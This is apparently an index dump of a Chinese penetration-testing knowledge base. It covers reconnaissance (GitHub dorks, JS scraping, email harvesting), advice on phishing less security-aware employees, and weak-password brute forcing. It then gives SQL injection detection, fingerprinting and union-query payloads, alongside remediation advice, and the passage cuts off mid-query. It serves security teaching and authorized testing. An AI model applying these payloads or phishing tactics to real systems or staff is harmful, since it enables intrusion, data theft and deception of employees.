\"prod\" \"pwd\" \"secure\" \"ssh\" \"staging\" \"stg\" \"stripe\" \"swagger\" \"testuser\" \"jdbc\" 推荐工具 查询过程也是重复性工作，可以借助工具来进行查找 [!DANGER] 工具毕竟是死板的，最好还是人工+工具一起 GitDorker https://github.com/obheda12/GitDorker GitDorker 是一款github自动信息收集工具，它利用 GitHub 搜索 API 和作者从各种来源编译的大量 GitHub dorks 列表，以提供给定搜索查询的 github 上存储的敏感信息的概述。 其他平台 GitLab: https://about.gitlab.com/ gitee: https://gitee.com/ Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:48:15 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/04.JS信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/04.JS信息收集.html","title":"04.JS信息收集","keywords":"","body":" JS信息收集 介绍 工具 JSFinder LinkFinder Hae JS信息收集 介绍 在JS中可能会存在大量的敏感信息，包括但不限于： 某些服务的接口，可以测试这些接口是否有未授权等 子域名，可能包含有不常见或者子域名收集过程中没收集到的目标 密码、secretKey等敏感数据 可以全局搜索http、\"/、这种关键词 工具 每个网站都拥有大量的js文件，明显一个个手动去判断是不现实的，既然是重复性的工作，那么就肯定可以用工具来完成，这里推荐几个常用的工具吧 JSFinder https://github.com/Threezh1/JSFinder JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具 用法参考项目文档，或者-h，不多说了 LinkFinder https://github.com/GerbenJavado/LinkFinder 这也是一款一直在用的工具，效果杠杠的，可以本地用，也可以集成到Burp插件里面 具体还是看README文档吧 Hae https://github.com/gh0stkey/HaE HaE是基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。 基于正则表达式，除了提取敏感信息，也可以提取页面中的链接等，所以也在这写写记录下 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 09:41:03 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/05.网盘信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/05.网盘信息收集.html","title":"05.网盘信息收集","keywords":"","body":" 介绍 在线云盘 搜索 百度网盘爬虫 介绍 某些安全意识薄弱的人员可能上传资料到一些网盘中，没有加密码或者密码泄露，然后被一些在线云盘抓取收录了，导致信息泄露。 在线云盘 [!NOTE] 直接网上一搜就有一大堆，因为不知道什么时候它会挂掉，建议多试几个 搜索 搜索建议一般以目标关键词为主，如单位名、单位别称等 百度网盘爬虫 [!WARNING] 没有实际试过，不知道效果咋样 https://github.com/search?q=%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%88%AC%E8%99%AB Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 11:29:38 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/06.邮箱信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/06.邮箱信息收集.html","title":"06.邮箱信息收集","keywords":"","body":" 邮箱信息收集 寻找目标邮箱入口 通过扫描C段 通过子域名 通过搜索引擎 在线平台收集 工具收集 验证邮箱 通过mailtester.com 使用verifyemail 使用snov.io 邮箱爆破 邮箱信息收集 目前情况来看，通过web打点不一定是最优的方式，可以社工等方式同步进行；因此尽可能多的收集目标的邮箱，然后进行社工钓鱼可能大有突破 [!TIP] 实际过程中，我们可以尽可能的把收集到疑似网络管理员、运维人员、安全部门的人员提取出来，这些人单独写邮件或者不发，因为这些人安全意识相对较高，容易打草惊蛇，我们需要对一些非技术员工安全意识薄弱的人下手，挑软柿子捏。 寻找目标邮箱入口 [!NOTE] 目标为开放的邮服端口或web邮箱入口 通过扫描C段 拿到目标后，先要先从MX记录域名找到他的真实ip地址（某些目标可能是第三方邮件服务器，这种情况mx记录就没有参考价值了） *　然后针对这个ip地址的C段进行扫描（25、109、110、143、465、995、993端口） 通过子域名 主要是利用一些子域名收集工具，如：Subdomainbrute、ksubdomain、Oneforall、Sublist3r、TeeMO、LangSrcCurise、Layer挖掘机等 通过搜索引擎 1、Google Hacking语法 site:target.com intitle:\"Outlook Web App\" site:target.com intitle:\"mail\" site:target.com intitle:\"邮箱\" 2、网络空间搜索引擎 Shodan fofa zoomeye hostname:163.com http.title:\"邮箱\" 在线平台收集 0、Google Hacking 万金油 [!WARNING] 可能结果不全也没那么多，影响的内容也比较多 1、https://app.snov.io/ 好用，真的好用，结果也多，支持API的方式调用，也可以批量验证邮箱 2、https://phonebook.cz/（还可以收集域名、URL） 3、https://hunter.io/ [!NOTE] 需要注册，需要绑定手机号，不然会打码，支持浏览器插件，好用 4、http://www.skymem.info/ 5、https://www.email-format.com/i/search/ 工具收集 https://github.com/laramies/theHarvester brew install theHarvester theHarvester -h usage: theharvester [-h] -d DOMAIN [-l LIMIT] [-S START] [-g] [-p] [-s] [--screenshot SCREENSHOT] [-v] [-e DNS_SERVER] [-t DNS_TLD] [-r] [-n] [-c] [-f FILENAME] [-b SOURCE] theHarvester is used to gather open source intelligence (OSINT) on a company or domain. optional arguments: -h, --help show this help message and exit -d DOMAIN, --domain DOMAIN Company name or domain to search. -l LIMIT, --limit LIMIT Limit the number of search results, default=500. -S START, --start START Start with result number X, default=0. -g, --google-dork Use Google Dorks for Google search. -p, --proxies Use proxies for requests, enter proxies in proxies.yaml. -s, --shodan Use Shodan to query discovered hosts. --screenshot SCREENSHOT Take screenshots of resolved domains specify output directory: --screenshot output_directory -v, --virtual-host Verify host name via DNS resolution and search for virtual hosts. -e DNS_SERVER, --dns-server DNS_SERVER DNS server to use for lookup. -t DNS_TLD, --dns-tld DNS_TLD Perform a DNS TLD expansion discovery, default False. -r, --take-over Check for takeovers. -n, --dns-lookup Enable DNS server lookup, default False. -c, --dns-brute Perform a DNS brute force on the domain. -f FILENAME, --filename FILENAME Save the results to an XML and JSON file. -b SOURCE, --source SOURCE anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye 验证邮箱 在收集邮箱之后，我们可以对邮箱进行存活性验证，检测目标邮箱是否存在被弃用的情况（离职，职位调动等）。 通过mailtester.com [!NOTE] https://mailtester.com/ 需要注册，支持使用临时邮箱注册 使用verifyemail [!NOTE] https://github.com/Tzeross/verifyemail 好用，真的好用，就是需要自己改代码，对不懂的小伙伴可能不是很友好哈哈哈 后面有时间自己改下 python3 verifyemail.py 使用snov.io [!NOTE] https://app.snov.io/verify/individual-emails 刚才我们也提到了这个网站，确实挺好用，就是不知道数量多了收费不 邮箱爆破 [!NOTE] 这种方式的弱口令爆破只适用于目标企业自己的邮件服务器如owa等 像百度腾讯阿里网易等第三方邮箱不优先考虑 SMTP协议爆破：medusa、hydra、SNETCracker、APT34组织 owa爆破工具等... 网页邮箱爆破：burpsuite等... [!TIP] 常用易忽略弱口令： 公司简称+年份；如 zgdx2022 用户名+123；如 wg123 抛砖引玉，自己多想想 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:42:12 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/07.历史页面.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/07.历史页面.html","title":"07.历史页面","keywords":"","body":" 介绍 推荐网站 推荐工具 介绍 wayback会记录网站版本更迭，可以获取到之前版本的网站，可能会找到一些后来删除的敏感资产信息，或者一些漏洞 推荐网站 [!NOTE] https://web.archive.org/ 好用，真的好用 2010年qq网qq.com 推荐工具 waybackurls:https://github.com/tomnomnom/waybackurls # 安装 go get github.com/tomnomnom/waybackurls # 使用举例 cat domains.txt | waybackurls > urls Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:20:21 "},"个人知识库/01.渗透测试/02.WEB漏洞/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/","title":"02.WEB漏洞","keywords":"","body":"尽可能全面的总结一些常见的基础漏洞，技巧： Google搜索： wiki cheatsheet tricks tips checklist Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-05 22:58:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/","title":"01.SQL注入","keywords":"","body":" 简介 产生原因 注入举例 应用场景 常见数据库 关系型数据库 非关系型数据库 漏洞危害 通用修复建议 代码层面 输入过滤 预编译SQL语句(参数化查询) 数据库层面 最小权限原则 禁用敏感函数 权限控制 统一编码 其他层面 学习靶场 TIPS 备忘录 简介 SQL注入（英语：SQL injection），也称SQLI或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而执行，因此遭到破坏或是入侵。 产生原因 SQL注入漏洞产生的原因是网站应用程序在编写时未对用户提交至服务器的数据进行合法性校验（类型、长度、业务参数合法性、敏感字符等），同时没有对用户输入数据进行有效地特殊字符过滤，使得用户的输入直接带入数据库执行，超出了SQL语句原来设计的预期结果，导致了SQL注入漏洞。 注入举例 以下代码为模拟web应用程序进行登录操作。若登录成功，则返回success，失败则返回fail fetch_row()){ echo \"success\"; }else{ echo \"fail\"; } ?> 用户名username和密码password均来自于用户的直接传入，无任何过滤，后直接拼接到SQL语句中。 正常用户登录时，sql语句如下： select * from users where username = 'admin' and password='password' 攻击者尝试登陆，输入用户名admin' or '1' = '1，输入密码123，因为是直接拼接，所以构造出的sql语句如下： select * from users where username = 'admin' or '1' = '1' and password='123' 此时因为sql语句中存在or '1'='1'，所以永为真，将会查询出所有的结果，也就会登录成功返回success。(这也是常说的万能密码之一) 应用场景 SQL注入漏洞可能出现在一切与数据库交互的地方，常见举例如下（主要还是存在于增删改查四个字上）： 简而言之：所有和数据库交互的点均可能存在SQL注入 关键字 功能举例 增 注册新用户、创建订单、添加文章…… 删 删除用户、删除订单…… 改 修改订单、更新用户信息…… 查 查询信息、筛选订单、搜索文章…… 常见数据库 关系型数据库和非关系型数据库 数据库包括关系型数据库和非关系型数据库，这两类数据库最主要的区别如下表所示 关系型数据库 非关系型数据库 特性 1、采用了关系模型来组织数据的数据库2、事务的一致性3、关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织 1、使用键值对存储数据；2、分布式；3、一般不支持ACID特性；4、非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合 优点 1、容易理解：二维表结构是非常贴近逻辑世界一个概念，关系模型相对网状、层次等其他模型来说更容易理解；2、使用方便：通用的SQL语言使得操作关系型数据库非常方便；3、易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率；4、支持SQL，可用于复杂的查询 1、无需经过sql层的解析，2、读写性能很高；基于键值对，数据没有耦合性，容易扩展；3、存储数据的格式：nosql的存储格式是key,value形式、文档形式、图片形式等等，文档形式、图片形式等等，而关系型数据库则只支持基础类型 缺点 1、为了维护一致性所付出的巨大代价就是其读写性能比较差；2、固定的表结构；3、高并发读写需求；4、海量数据的高效率读写； 1、不提供sql支持，学习和使用成本较高；2、无事务处理，附加功能bi和报表等支持也不好 常见的关系型数据库和非关系型数据库有如下几种，本章主要讨论关系型数据库的注入问题 关系型数据库 MySQL Oracle PostgreSQL MSSQL DB2 Access 非关系型数据库 MongoDB Redis MemcacheDB InfluxDB Hbase 漏洞危害 获取数据库访问权限，甚至获得DBA权限，从而获取数据库中的所有数据，造成信息泄漏；（可获取数据） 对数据库的数据进行增加、删除、修改操作，例如删除数据库中重要数据的表（可进行增删改操作） 通过构造特殊的数据库语句，可操作数据库进入后台或者插入木马，以获取整个网站和数据库的控制权限，篡改网页，发布不良信息等；（可获取网站权限） 获取服务器最高权限，远程控制服务器，甚至导致局域网(内网)被入侵；（可获取服务器权限） 通用修复建议 代码层面 输入过滤 严格控制输入数据的类型；如通过id获取用户信息时，仅允许传入的id为整型 严格控制输入数据的长度；如限制用户名长度应小于20 输入合法性判断；禁止出现一些特殊字符或关键词，如'，\"，\\，，>，&，*，;，#，select，from，where，sub，if，union，sleep，and，or等 对所有可能的输入点进行判断检测，如UA、IP、Cookie等 预编译SQL语句(参数化查询) 参数化查询是一种查询类型，其中占位符用于填充参数，参数值在执行时提供。原理是采用了预编译的方法，先将SQL语句中可被用户控制的参数集进行编译，生成对应的临时变量集，再使用对应的设置方法，为临时变量集里面的元素进行赋值，赋值过程中会对传入的参数进行强制类型检查和安全检查。 所有与数据库交互的业务接口均采用参数化查询，参数化的语句使用参数而不是将用户输入变量直接嵌入到SQL语句中，参数化查询是防御SQL注入的最佳方法，比如：Java中的PreparedStatement，PHP中的PDO等。 数据库层面 最小权限原则 遵循最小化权限原则，严格限制网站用户的数据库的操作权限，禁止将任何高权限帐户（sa，dba、root等）用于应用程序数据库访问，从而最大限度的减少注入攻击对数据库的危害。 禁用敏感函数 防止攻击者通过SQL注入获取到除数据库外的其他更高权限，如系统权限等； 比如MSSQL中，拒绝用户访问敏感的系统存储过程，如xp_dirtree、xp_cmdshell等。 权限控制 限制用户仅能够访问必须使用的数据库表。 统一编码 网站与数据层的编码统一，建议全部使用UTF-8编码，避免因上下层编码不一致导致一些过滤模型被绕过，比如宽字节注入等。 其他层面 网站应避免抛出SQL语句执行过程中的错误信息，如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断； 使用通用防注入系统，或者部署WAF等。 学习靶场 DVWA sqli-labs TIPS 在测试SQL注入的时候，一定要思考后端的SQL语句是如何书写的，只有判断出后端SQL语句的大概书写情况，才能知道我们可控注入点的位置，可能是select sqli、where id =、order by sqli，这样才好对症下药。 内容可能有遗漏，发现可以补充的再补吧，一点点的完善 备忘录 https://pentestmonkey.net/category/cheat-sheet/sql-injection https://sqlwiki.netspi.com/ 备份 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/01.注入点检测/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/01.注入点检测/","title":"01.注入点检测","keywords":"","body":" 前言 注入点位置 注入检测 前言 挖掘SQL注入漏洞的第一步，就是发现SQL注入漏洞，只有发现了注入点才能够继续深入利用。 可以通过多种方式来检测是否存在注入，最简单的就是直接在参数后加上'或者\"等特殊字符让web应用程序抛出异常；但这种情况已经很少见了，比较好的方法是通过盲注来进行判断； 注入点位置 之前也提到过，所有和数据库有交互的地方均可能存在SQL注入，因此我们在分析数据包的时候，可以关注一下哪些数据可能会和数据库交互，从而进行测试是否存在SQL注入漏洞。 举例 POST /?id=homePage HTTP/1.1 Host: www.netspi.com Connection: close Cache-Control: max-age=0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 X-Server-Name: PROD Cookie: user=harold; Content-Type: application/x-www-form-urlencoded username=harold&email=harold@netspi.com 分析上面这个数据包，红框中的内容都可能会和数据库交互，因此都可能存在SQL注入，其他数据包分析类似 如果传输的是json格式的数据，在使用双引号闭合时，记得使用\\来防止破坏json数据结构，如下，其他特殊格式数据类似 {\"username\":\"test\\\"\"} 注入检测 检测是否存在注入一般通过两种方式来判断： 输入特殊字符是否抛出相关的异常 输入一些语句运行后是否达到我们预期的结果（返回内容、响应时间等） 此处只是举例，抛砖引玉，多尝试构造 类型 语句和结果 特殊字符 id=')\") ==> 抛出异常 逻辑算数测试 id=' and 2*3 = 6 -- ==> Trueid=' and 2*3 = 5 -- ==> Falseid=2*3 ==> 是否返回id=6相关的内容id=1/1 ==> Trueid=1/0 ==> False或者异常 返回延时 id=' and sleep(5) ==> 延时5秒甚至更久，需要根据特定的数据库函数来判断 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/02.数据库识别/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/02.数据库识别/","title":"02.数据库识别","keywords":"","body":" MySQL Oracle MSSQL PostgreSQL 一些经验 确认注入点后，我们需要识别后端所使用的数据库，因为不同的数据库注入的方式不一样，后期利用手法和条件也不一样。 [!TIP] 核心就是利用数据库特有的一些语法或者函数来判断即可，毕竟要满足该数据库的语法后SQL语句才能正常执行；下面的例子不全面，只是给大家提供一个思路，最明显的就是休眠函数 MySQL 空格--空格是注释，根据具体情况看是否添加 描述 语句 SLEEP函数 page.php?id=1'-SLEEP(1)=0 LIMIT 1 -- BENCHMARK函数 page.php?id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 -- 字符串连接(注意有个空格) page.php?id=' 'mysql' --page.php?id=' and concat('some','string') 版本信息 select @@versionselect version() 错误消息(根据返回的错误信息判断) page.php?id=' 特有函数 select connection_id()select last_insert_id()select row_count() Oracle 描述 语句 字符串连接 `page.jsp?id=' 'oracle' -- a` 默认表 page.jsp?id='UNION SELECT 1 FROM v$version --select banner FROM v$versionselect banner FROM v$version WHERE rownum=1 错误消息(根据返回的错误信息判断) page.jsp?id=' MSSQL 描述 语句 WAITFOR 函数 page.asp?id=';WAITFOR DELAY '00:00:10'; -- 堆叠查询默认变量 page.asp?id=sql'; SELECT @@SERVERNAME -- 错误消息(根据返回的错误信息判断) page.asp?id=' 错误消息(如果id参数是整数， 则@@SERVERNAME变量的字符串值可能导致转换错误) page.asp?id=@@SERVERNAME 错误消息(如果id参数是整数， 则@@SERVERNAME变量的字符串值可能导致转换错误) page.asp?id=0/@@SERVERNAME 常量 @@pack_received@@rowcount PostgreSQL 描述 语句 字符串连接 `page.jsp?id=' 'postgresql' -- a` 休眠函数 page.jsp?id=' and (select pg_sleep_for('5 sec')) is null -- a 一些经验 方法 数据库 常用搭配 asp => mssql、access aspx => mssqlphp => mysql、postgresqljava => mysql、oracle、mssql 默认端口 oracle => 1521mssql => 1433mysql => 3306postgresql => 5432 数据库特有函数 pg_sleep() => postgresqlbenchmark() => mysqlwaitfor delay => mssqlDBMS_PIPE.RECEIVE_MESSAGE() => oracle… 特殊符号 ; => 字句查询标识符，postgresql、mssql 默认可堆叠查询# => Mysql 注释符 特定表名 information_schema => mssql,postgresql,mysqlpg_tables => postgresqlsysobjects => mssqlall_tables,user_tables => oracle 报错banner信息 ... 比较全面可以参考：https://bak.gm7.org/pentestmonkey.net/category/cheat-sheet/sql-injection.html 里面的函数很多，也有执行后的结果（有些函数可能适用多个数据库，可以多用几个判断试试） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/01.常用符号:函数:语句归类.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/01.常用符号:函数:语句归类.html","title":"01.常用符号:函数:语句归类","keywords":"","body":" 常用符号 注释符 运算符 全局变量 常用函数 数据库信息 数据类型转换 字符串截取 字符串拼接 数据匹配 条件函数 其他 常用语句 常用符号 注释符 注释符 说明 #(%23) 单行注释在URL中#表示锚点，也就是hash路由，带上#不会请求后端路由，而是刷新前端路由，所以测试一般用URL编码后的%23 ---- -+--+ 单行注释注意--后还有一个空格；其中+号会被URL解码为空格 /**/ 多行(内联)注释一般用于绕过WAF、代替空格等 运算符 运算符 说明 && 与，同 and ｜｜ 或，同 or ! 非，同 not ^ 异或，同xor \\ 转义符 ~ 一元比特反转 左移 >> 右移 + 加，URL解码后可替代空格 - 减法 * 乘法 / 或 div 除法 % 或 mod 取余 = 等于 <>, != 不等于 > 大于 小于 小于等于 >= 大于等于 BETWEEN 在两值之间 NOT BETWEEN 不在两值之间 IN 在集合中 NOT IN 不在集合中 严格比较两个NULL值是否相等 LIKE 模糊匹配 REGEXP 或 RLIKE 正则式匹配 IS NULL 为空 IS NOT NULL 不为空 全局变量 所有全局变量可通过如下语句查看： SHOW GLOBAL VARIABLES; SHOW VARIABLES; 变量 说明 @@VERSION 返回版本信息 @@GLOBAL.VERSION 同@@VERSION @@HOSTNAME 返回安装的计算机名称 @@BASEDIR 返回MYSQL绝对路径 @@DATADIR 数据路径 常用函数 完整的各种函数可以参考：https://www.runoob.com/mysql/mysql-functions.html 数据库信息 函数 说明 USER() 获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER() DATABASE() 获取当前选择的数据库名，同SCHEMA() VERSION() 获取当前版本信息 数据类型转换 函数 说明 ASCII(str) 返回字符串第一个字符的ASCII值 ORD(str) 同ORD(str) HEX(N_S) 参数为字符串时，返回 N or S 的16进制字符串形式；为数字时，返回其16进制数形式 UNHEX(str) HEX(str) 的逆向函数将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符 BIN(N) 返回十进制数值 N 的二进制数值的字符串表现形式N 是一个BIGINT型数值，作用相当于CONV(N,10,2) OCT(N) 返回十进制数值 N 的八进制数值的字符串表现形式 CONV(N,from_base,to_base) 将数值型参数 N 由初始进制 from_base 转换为目标进制 to_base 的形式并返回 CHAR(N,... [USING charset_name]) 将每一个参数 N 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串 字符串截取 函数 说明 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为SUBSTRING的简单版str : 截取的字符串 N_start : 截取起始位置 ( mysql中的start是从1开始的 ) N_length : 截取长度 SUBSTRING(str,start)SUBSTRING(str,start,len)SUBSTRING(str FROM start)SUBSTRING(str FROM start FOR len) 对指定字符串进行截取，有多种形式str : 截取的字符串 start : 截取起始位置 ( mysql中的start是从1开始的 ) len : 截取长度 MID(str,pos,len) 同于 SUBSTRING(str,pos,len) RIGHT(str,len) 对指定字符串从最右边截取指定长度 LEFT(str,len) 对指定字符串从最左边截取指定长度 RPAD(str,len,padstr) 在 str 右方补齐 len 位的字符串 padstr，返回新字符串如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度 LPAD(str,len,padstr) 与RPAD相似，在str左边补齐 INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串INSERT(str,len,1,0x0)可当做截取函数 字符串拼接 函数 说明 CONCAT(str1,str2...) 函数用于将多个字符串合并为一个字符串 CONCAT_WS(separator,str1,str2...) 和concat函数类似，只是通过分隔符separator将字符串连接在一起 GROUP_CONCAT(...) 返回一个字符串结果，该结果由分组中的值通过逗号连接组合而成 MAKE_SET(bits,str1,str2,...) 返回一个设定值(含子字符串分隔字符串\",\"字符)，在设置位的相应位的字符串可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710')) 数据匹配 函数 说明 = statement 全匹配 LIKE \"statement\" 匹配数据，%代表任意内容 REGEXP \"statement\" 正则匹配数据 RLIKE \"statement\" 与regexp相同，正则匹配数据 条件函数 函数 说明 IF(exp,state1,state2) 条件语句，exp为true，执行state1，否则执行state2 CASE...WHEN exp THEN state1 ELSE state2 END 同IF，...可直接省略 NULLIF(expr1,expr2) 若expr1与expr2相同，则返回expr1，否则返回NULL 其他 函数/语句 说明 SLEEP(N) 休眠N秒 BENCHMARK(count,expr)： 将表达式expr重复运行count次（消耗CPU），可以达到sleep()的效果 ORDER BY 用于对结果集进行排序，默认按照升序对记录进行排序 EXISTS(sql) 判断SQL语句执行后是否有结果；存在的话返回结果为：1（true），不存在的话返回结果：0（false） LIMIT m,n 查询结果从 m 开始取 n 个 LENGTH(str) 返回字符串的长度 LOAD_FILE(filePath) 读取文件内容，可以将文件名转换成ASCII码或者十六进制的形式；secure_file_priv默认情况下为null不允许读文件ASCII码需要用char()函数,char(96,97)十六进制前面要加上 0x读取内容不显示的情况下，可以用hex()函数：hex(load_file()) PI() 返回π的具体数值 LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置 POSITION(substr IN str) 等同于 LOCATE() LOWER(str) 将字符串的大写字母全部转成小写同：LCASE(str) UPPER(str) 将字符串的小写字母全部转成大写同：UCASE(str) ELT(N,str1,str2,str3,...) 与MAKE_SET(bit,str1,str2...)类似，根据N返回参数值 CHARSET(str) 返回字符串使用的字符集 DECODE(crypt_str,pass_str) 使用 pass_str 作为密码，解密加密字符串 crypt_str加密函数：ENCODE(str,pass_str) 常用语句 可以自己去看一下数据库里面每个系统表存放的啥信息，就明白为啥很多语句要这样写了 更多参考：https://bak.gm7.org/sqlwiki.netspi.com/attackQueries/informationGathering/index.html#mysql 说明 语句 基础信息 获取数据库版本信息select version();select @@innodb_version;获取当前用户select user();获取当前数据库select database()；数据路径select @@datadir; 获取所有数据库 select schema_name from information_schema.schemata; 获取所有用户 查看表结构desc mysql.user获取所有用户信息select * from mysql.user 获取当前数据库的表名 desc information_schema.tables;select table_name from information_schema.tables where table_schema = database();select group_concat(table_name) from information_schema.tables where table_schema = database(); 获取当前数据库的某表的列名 select column_name from information_schema.columns where table_name = '表名';select group_concat(column_name) from information_schema.columns where table_name = '表名'; 获取当前数据库中某列的值 select id ,username,password from users; 查询DBA账户（一般root） select host, user from mysql.user where super_priv = 'y'; Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/02.各种注入手法.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/02.各种注入手法.html","title":"02.各种注入手法","keywords":"","body":" 前情提要 联合(UNION)查询注入 概念 注意 注入流程 总结 扩展：limit注入点字段数判断 报错注入 概念 注意 注入流程 报错函数 floor() extractValue() updatexml() exp() GTID相关函数 ST相关函数 几何函数 BIGINT uuid相关函数 不存在的函数 name_const() join using 盲注 布尔盲注 概念 常用函数 注入流程 常见语句 总结 扩展：基于正则的盲注 扩展：未知列名的盲注 时间盲注 概念 应用场景 常用函数 常见语句 DNS注入（简化盲注） 概念 应用场景 利用语句 order by注入 概念 判定存在 利用语句 limit注入 无order by 有order by 二次注入 概念 利用分析 利用过程 宽字节注入 魔术引号 编码字符集 概述 流程分析 注入语句 扩展 Update注入 False注入 堆叠注入 HTTP头部注入 其他：文件读写 配置问题 读文件 写文件 日志getshell 前情提要 所有的注入过程中，都需要思考目标可能使用的SQL语句，再根据我们可以控制的部分结构进行尝试注入 字符型注入都需要先闭合才可以继续进行 sqli-labs环境快速搭建 docker pull acgpiano/sqli-labs docker run -d --rm -it --name sqli -p 80:80 acgpiano/sqli-labs 联合(UNION)查询注入 概念 页面将SQL语句执行后返回的内容显示在了页面中(如下例子中是标题、账号密码等信息)，这种情况就叫有回显。 对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字union、union all拼接恶意SQL语句，union后面的select得到的结果将拼接到前个select的结果的后面 正常情况下，SQL语句的union联合查询常用格式如下 select 1,2,3 from xxx union select 4,5,6 from vuls; /* +---+---+---+ | 1 | 2 | 3 | +---+---+---+ | 1 | 2 | 3 | | 4 | 5 | 6 | +---+---+---+ */ 在注入过程中，我们把union select 4,5,6 from vuls部分称作是union注入部分,它的主要特点是通过union和前面一条SQL语句拼接，并构造其列数与前面的SQL语句列数相同,如1,2,3和4,5,6均为3列。我们把这种注入方式称为union注入。 注意 union查询时，我们构造的select语句的字段数要和当前表的字段数相同才能联合查询，否则会抛出The used SELECT statements have a different number of columns的错误 若回显仅支持第一行数据的话，我们需要让union前边正常查询的语句返回的结果为空，才能让我们想要的数据展现出来；返回为空只需要让union前面的内容在数据库中查询不到结果即可 union，union all区别 union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序 注入流程 1、确认列数：前面说过，我们union查询前后的字段数必须是一样的才能查询，因此我们的第一步，就是通过order by或者group by获取当前查询的字段数； 1' order by 3 -- - 返回正常，说明前面查询的列数 >= 3 1' order by 4 -- - 返回不正常，说明前面查询的列数 因此说明此处的查询列数为3 2、判断显位：既然已经知道了查询列数了，那我们就需要判断哪些列的内容是可以显示到前端的，因为能显示到前端的字段，我们在利用时也能直接显示我们想要的数据 1' union select 1,2,3 -- - 执行后页面正常 没有显示出1、2、3相关的内容，这是因为查询只显示第一条结果，我们只需要让union查询前半部分的内容为空即可 修改后的payload -1' union select 1,2,3 -- - 可以看到2、3这两列为显位 3、获取数据：已经知道哪些列可以显示出来了，直接替换为我们的sql语句即可 首先查询当前数据库名database()、数据库账号user()、数据库版本version()等基本信息，再根据不同版本，不同的权限来确定接下来的方法 版本 手法说明 MySQL 小于5.0，由于缺乏系统库information_schema，故通常情况下，无法直接找到表，字段等信息，只能通过猜解的方式来解决直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔注入来猜解 MySQL >= 5.0 存在系统库information_schema，可直接查询到库名，表名，列名等信息 查询数据的一般顺序为库名 --> 表名 --> 列名 --> 字段内容，其他内容可以按需查询扩展 查询当前数据库名 -1' union select 1,database(),3 -- - 查询所有数据库名 -1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- - 查询当前数据库的所有表名 -1' union select 1,2,group_concat(table_name) from information_schema.tables where 